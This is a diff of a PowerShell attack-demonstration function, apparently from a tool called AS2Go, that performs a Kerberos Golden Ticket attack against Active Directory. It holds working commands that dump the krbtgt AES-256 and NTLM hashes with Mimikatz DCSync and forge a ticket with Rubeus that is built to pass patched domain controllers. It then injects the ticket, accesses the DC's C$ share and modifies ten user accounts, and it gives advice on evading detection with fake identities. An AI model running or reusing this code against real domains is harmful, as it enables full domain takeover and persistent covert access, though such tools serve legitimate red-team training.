@@ -3,13 +3,18 @@
 Demonstrates Golden Ticket creation and its use against a selected domain.
 
 .DESCRIPTION
-Prompts for a domain and a built-in Administrator, generated fake identity, or previously saved ticket identity.
-Offers a Mimikatz DCSync request for the domain krbtgt hash, saves a retrieved hash, and prompts to confirm or replace it.
-On confirmation, purges cached tickets and forges and injects a Golden Ticket using the configured domain SID.
-Displays cached tickets, attempts access to the DC C$ share, and changes the info attribute of up to ten domain users.
+Prompts for a domain and a built-in Administrator or a generated fake identity.
+Offers a Mimikatz DCSync request for the domain krbtgt hashes and saves retrieved hashes.
+On confirmation, forges a Golden Ticket with Rubeus golden using the domain SID and the krbtgt key.
+Rubeus includes the PAC_REQUESTOR structure and domain-policy lifetimes, which hardened Domain
+Controllers require since the November 2022 Kerberos patching; Mimikatz-forged tickets without this
+structure are rejected with KDC_ERR_TGT_REVOKED. The forged ticket is validated against the Domain
+Controller with Import-KirbiFile before injection.
+Displays cached tickets, attempts access to the DC C$ share, and changes the info attribute of up to
+ten domain users.
 
 .EXAMPLE
-Invoke-GoldenTicket
+Invoke-GoldenTicketAttack
 Runs this workflow using the initialized AS2Go module configuration.
 
 .INPUTS
@@ -20,15 +25,16 @@ Console messages and output from invoked commands; no dedicated result object is
 
 .NOTES
 Private AS2Go function. Run from an initialized AS2Go module session.
-Requires Mimikatz, initialized AS2Go domain settings, and the rights needed for the selected operations.
+Requires Mimikatz and Rubeus, initialized AS2Go domain settings, and the rights needed for the
+selected operations. Works against Domain Controllers hardened by KB5008380/KB5020805.
 
 .COMPONENT
 Category: Main Function
 
 .FUNCTIONALITY
-Demonstrates how a compromised krbtgt hash can be used to forge and inject a Kerberos Golden Ticket.
-Offers DCSync hash retrieval, selects a ticket identity, and inspects cached tickets after injection.
-Tests DC administrative-share access and attempts to change the info attribute of up to ten domain users.
+Demonstrates how a compromised krbtgt hash can be used to forge a PAC_REQUESTOR-compliant Golden Ticket with Rubeus.
+Offers DCSync hash retrieval, selects a ticket identity, and validates the forged ticket against the hardened KDC before injection.
+Inspects cached tickets after injection and tests DC administrative-share access.
 #>
 Function Invoke-GoldenTicketAttack {
 
@@ -38,8 +44,8 @@ Function Invoke-GoldenTicketAttack {
     If (-not $SkipClearHost) { Clear-Host }
     Write-AS2GoOutput -Type Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
     Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
-    Write-AS2GoOutput -Type Bullet -M "Dump the NTLM Hash for the 'krbtgt' Account "
-    Write-AS2GoOutput -Type Bullet -M "Forge a Golden Ticket"
+    Write-AS2GoOutput -Type Bullet -M "Dump the AES-256 and NTLM Hash for the 'krbtgt' Account "
+    Write-AS2GoOutput -Type Bullet -M "Forge a Golden Ticket compliant with hardened Domain Controllers"
     Write-AS2GoOutput -Type Bullet -M "Use the Golden Ticket to Achieve Unrestricted Kerberos dominance"
 
     If ($UnAttended) {
@@ -57,26 +63,27 @@ Function Invoke-GoldenTicketAttack {
     $sSuffix = Get-Date -Format yyyyMMdd
     $ShadowUser = "FU-$sSuffix.$sPrefix"
     
-    Write-AS2GoOutput -Type H1 -Message "`nSelect an (fake) account for the Golden Ticket attack, for "
+    Write-AS2GoOutput -Type H1 -Message "`nSelect a (fake) account for the Golden Ticket attack"
     Write-AS2GoOutput -Type Bullet -Message "A fake user improves stealth because it is not tied to a known, monitored admin account, making attribution and unusual account activity harder to detect."
     Write-AS2GoOutput -Type Bullet -Message "It also avoids password-reset effects and enables long-lived TGTs, since ticket validity can be set independently of normal password and ticket policies."
 
-    $title = "Select an (fake) account for the Golden Ticket attack."
+    $title = "Select a (fake) account for the Golden Ticket attack."
     $message = "Enter your choice!"
     $Options = @(
         [pscustomobject] @{ Label = "&User Account"; Help = "Select an existing AD user account from domain/forest"; Value = "Real" },
         [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, $ShadowUser"; Value = "Fake" }
     )
     $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
-    
+
     If ($answer -eq "Fake") {
         $dn = Select-ADObject -DomainSelectionOnly -Title "Select a domain for the Golden Ticket demonstration"
         If (-not $dn) {
             Write-AS2GoOutput -Type Info -Message "No domain selected for the Golden Ticket demonstration."
             return
-            $cn = Convert-FromDNToCN -DistinguishedName $dn
-            Write-AS2GoOutput -Type Textmaker -message "Selected Domain" -TM $cn
         }
+        $cn = Convert-FromDNToCN -DistinguishedName $dn
+        $id = 6543210
+        Write-AS2GoOutput -Type Textmaker -message "Selected Domain" -TM $cn
     }
     else {
         $dn = Select-ADObject -Title "Select an user for the Golden Ticket demonstration" -IncludeUsers -MarkTier0 -BlockOUSelection
@@ -88,12 +95,11 @@ Function Invoke-GoldenTicketAttack {
         $server = Get-BestDomainController -domain $dn
         $realUser = Get-ADUser -Server $server -identity $dn
         $ShadowUser = $realUser.SamAccountName
+        $id = $($realUser.Sid.Value).Split("-")[-1]
         $dn = if ($dn -match '(?i)(^|,)(DC=[^,]+(?:,DC=[^,]+)*)$') { $Matches[2] } else { $null }
-
         Write-AS2GoOutput -Type Textmaker -message "Selected Account - " -TM $cn
     }    
 
-    $fqdn = Convert-FromDNToCN -DistinguishedName $dn
     $server = Get-BestDomainController -domain $dn
     $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$dn" } | Select-Object DomainFQDN, DomainSID, NetBIOSName, IsRootDomain 
     
@@ -111,7 +117,7 @@ Function Invoke-GoldenTicketAttack {
 
     If (-not $SkipClearHost) { Clear-Host }
 
-    Write-AS2GoOutput -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
+    Write-AS2GoOutput -Type  Header -M " Step 1 of 3 | Dump the AES-256 and NTLM Hash for the 'krbtgt' account"
     Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
       
         
@@ -120,29 +126,41 @@ Function Invoke-GoldenTicketAttack {
 
     $answer = show-decisionPrompt
 
+    $Script:ASKrbtgtNtml = $null
+    $Script:ASKrbtgtAes256 = $null
+
     If ($answer -eq $Script:Yes) {
         Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$ShadowUser.log" "lsadump::dcsync /domain:$Script:ASFQDN /dc:$server /user:$KrbtgtSID"  "exit" }
-        #Invoke-Item "$Script:DefautExfiltrationFolder\$ShadowUser.log"
-        
-        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'Hash NTLM:'
 
-        if (([string]::IsNullOrEmpty($result))  ) {
-            Write-AS2GoOutput -type Error -Message  "Failed receiving NTLM Hash for $KrbtgtAccount account"
+        [string]$result = Get-Content -Path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'aes256_hmac'
+        If (-not [string]::IsNullOrEmpty($result)) {
+            $Script:ASKrbtgtAes256 = $result.Split(":")[-1].Trim()
         }
-        else {
-            $hash = $result.Replace(" ", "").Split(":")[-1]
-            Write-AS2GoOutput -type Success -Message "Identified NTLM Hash $hash for $KrbtgtAccount account"
+
+        [string]$result = Get-Content -Path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'Hash NTLM:'
+        If (-not [string]::IsNullOrEmpty($result)) {
+            $Script:ASKrbtgtNtml = $result.Replace(" ", "").Split(":")[-1]
+        }
+
+        If ($Script:ASKrbtgtAes256) {
+            Write-AS2GoOutput -Type Success -Message "Identified AES-256 Hash $($Script:ASKrbtgtAes256) for $KrbtgtAccount account" -NoExtraLines
+        }
+        If ($Script:ASKrbtgtNtml) {
+            Write-AS2GoOutput -Type Success -Message "Identified NTLM Hash $($Script:ASKrbtgtNtml) for $KrbtgtAccount account" -NoExtraLines
+        }
+        If (-not ($Script:ASKrbtgtAes256 -or $Script:ASKrbtgtNtml)) {
+            Write-AS2GoOutput -type Error -Message "Failed receiving AES-256 and NTLM hashes for $KrbtgtAccount account" -NoExtraLines
         }
         
         if ($UnAttended) { Start-Sleep 2 } else { Pause }
     }
 
-    If (-not $SkipClearHost) { Clear-Host }
-    #$Script:ASDomainSID = Get-ASConfig -Setting "DomainSID" 
-    #$Script:ASSearchBase = Get-ASConfig -Setting "AS2GoSearchBase"
-    $Script:ASKrbtgtNtml = $hash
-        
-        
+    If (-not ($Script:ASKrbtgtAes256 -or $Script:ASKrbtgtNtml)) {
+        Write-AS2GoOutput -Type Warning -Message "No krbtgt hash available. The Golden Ticket forge needs a valid hash; run the DCSync step again." -NoExtraLines
+        Measure-FunctionRuntime -End -Details $Info
+        return
+    }
+
     If ($temp.IsRootDomain -eq $true) {
         $groups = "512,513,518,519"
     }
@@ -150,61 +168,77 @@ Function Invoke-GoldenTicketAttack {
         $groups = "512,513"
     }
 
+    If (-not $SkipClearHost) { Clear-Host }
 
-    # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:500 /groups:500, 501, 513, 512, 520, 518, 519 /ptt" "exit"
+    Write-AS2GoOutput -Type  Header -M "Step 2 of 3 | Forge a Golden Ticket with Rubeus"
 
-    #    $ShadowUser = "Administrator"
-    Write-Host ""
-    Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $ShadowUser, " /id:", "6666666", " /groups:", $groups, " /ptt"" ""exit"""  `
-        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
-        
-       
+    $Rubeus = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"
+    $forgeTicketFile = "$Script:AS2GoTicketsDir\GT.kirbi"
+
+    $forgeHash = $Script:ASKrbtgtAes256
+    $forgeHashType = "/aes256:"
+    If (-not $forgeHash) {
+        $forgeHash = $Script:ASKrbtgtNtml
+        $forgeHashType = "/rc4:"
+    }
+
+    Write-AS2GoOutput -Type Info -Message "Rubeus forges the Golden Ticket with the PAC_REQUESTOR structure and domain-policy ticket lifetimes. Hardened Domain Controllers (KB5008380/KB5020805) reject Mimikatz-forged tickets without this structure (KDC_ERR_TGT_REVOKED)."
+
+    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
+    Write-Highlight -Text ".\Rubeus.exe ", "golden", " /user:", $ShadowUser, " /id:", $id, " /sid:", $Script:ASDomainSID, " $forgeHashType", $forgeHash, " /domain:", $Script:ASFQDN, " /startoffset:-10 ", " /outfile:", $forgeTicketFile `
+        -Color $fgcC, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
+
     $answer = Show-DecisionPrompt
     
         
     If ($answer -eq $Script:Yes) {
 
+        Remove-Item $forgeTicketFile -ErrorAction SilentlyContinue
 
+        $goldenArgs = @(
+            "golden",
+            "/user:$ShadowUser",
+            "/id:$id",
+            "/sid:$Script:ASDomainSID",
+            "$forgeHashType$forgeHash",
+            "/domain:$Script:ASFQDN",
+            "/startoffset:-10",
+            "/endtime:11d",
+            "/outfile:$forgeTicketFile"
+        )
+
+        & $Rubeus @goldenArgs 2>&1 | Out-Host
+        $forgeTicketFile = get-childitem $Script:AS2GoTicketsDir | sort-object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty Fullname  
+        If (-not (Test-Path -Path $forgeTicketFile)) {
+            Write-AS2GoOutput -type Error -Message "Failed to forge a Golden ticket for '$ShadowUser'. No ticket file was created."
+            Measure-FunctionRuntime -End -Details $Info
+            return
+        }
+
+        Write-AS2GoOutput -type Success -Message "Golden ticket for '$ShadowUser' forged and saved to '$forgeTicketFile'."
         set-ASConfig -Setting "ASP07KR" -Value "$($Script:ASFQDN)|$($ShadowUser)|$($Script:ASKrbtgtNtml)|$($groups)|$($Script:ASDomainSID)" -DPAPI
 
-        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$ShadowUser`GT.log" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:6666666 /groups:$groups /ptt" "exit" }
-
-             
-        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$ShadowUser`GT.log" | Select-String 'Golden ticket for'
-
-        if (([string]::IsNullOrEmpty($result))  ) {
-            Write-AS2GoOutput -type Error -Message  "Failed to summit a Golden ticket for '$ShadowUser'."
-        }
-        else {
-            #Golden ticket for 'FU-20260520.144200 @ WS19-CHILD01.WS19-ROOT.CORP' successfully submitted for current session
-            Write-AS2GoOutput -type Success -Message $result
-        }
-            
-            
-        Pause
+        
+        if (-not $unattended) { Pause }
         If (-not $SkipClearHost) { Clear-Host }
          
         
-        Write-AS2GoOutput -type Header -message "Displays a list of currently cached Kerberos tickets"
-        Write-AS2GoOutput -type CodeSnippet -message "Command:"
-
-        Write-Highlight -Text ('      klist') -Color $fgcC
-        Write-Host ""  
-        #Pause
+        Write-AS2GoOutput -type Header -message "Validate and inject the Golden Ticket"
         Set-NewColorSchema -NewStage $Script:GoldenTicket
-        $tickets = Get-KlistTicket
-        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-        Write-AS2GoOutput -Type Info -Message "Last Ticket"
-        $tickets | Select-object -Last 1 | Format-List
-        Write-Host ""
-        Pause
-            
-        Set-NewColorSchema -NewStage $Script:InitialStart    
+        $validated = Import-KirbiFile -TicketFile $forgeTicketFile -Service "cifs/$server" -DomainController $server
+
+        If (-not $validated) {
+            Measure-FunctionRuntime -End -Details $Info
+            return
+        }
+
         If (-not $SkipClearHost) { Clear-Host }
         
         Write-AS2GoOutput -type Header -message "Step 3 of 3 | Test the Golden Ticket"
         #"Make some changes to the Domain to verify the Golden Ticket attack was successful"
+
+
+        Test-AccessToOneDCPerDomain
         
         $passed = Test-AccessDirectory -directory "\\$server\c$\*.*"
         
@@ -217,27 +251,23 @@ Function Invoke-GoldenTicketAttack {
             Write-AS2GoOutput -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
         }
 
-        Get-ADUser -filter * -SearchBase $dn -server $server | Select-Object -first 10  | Set-ADUser -replace @{info = "Golden Ticket Attack - $ShadowUser was here" }
-        get-ADUser -filter * -SearchBase $dn -server $server -Properties * | Select-Object sAMAccountName, whenChanged, Displayname, info | Select-Object -first 10 | Format-Table
+        $users = Get-ADUser -Filter * -SearchBase $dn -Server $server |
+        Get-Random -Count 10
+
+        foreach ($user in $users) {
+            Set-ADUser -Identity $user.DistinguishedName `
+                -Server $server `
+                -Replace @{ info = "Golden Ticket Attack - $ShadowUser was here" }
+        }
+
+        Get-ADUser -Filter * -SearchBase $dn -Server $server -Properties info, whenChanged, DisplayName |
+        Where-Object { $_.DistinguishedName -in $users.DistinguishedName } |
+        Select-Object sAMAccountName, DisplayName, whenChanged, info |
+        Format-Table -AutoSize
 
 
         Pause
     }
-
-
-    $users = Get-ADUser -Filter * -SearchBase $dn -Server $server |
-    Get-Random -Count 10
-
-    foreach ($user in $users) {
-        Set-ADUser -Identity $user.DistinguishedName `
-            -Server $server `
-            -Replace @{ info = "Golden Ticket Attack - $ShadowUser was here" }
-    }
-
-    Get-ADUser -Filter * -SearchBase $dn -Server $server -Properties info, whenChanged, DisplayName |
-    Where-Object { $_.DistinguishedName -in $users.DistinguishedName } |
-    Select-Object sAMAccountName, DisplayName, whenChanged, info |
-    Format-Table -AutoSize
 
 
     Measure-FunctionRuntime -End -Details $Info
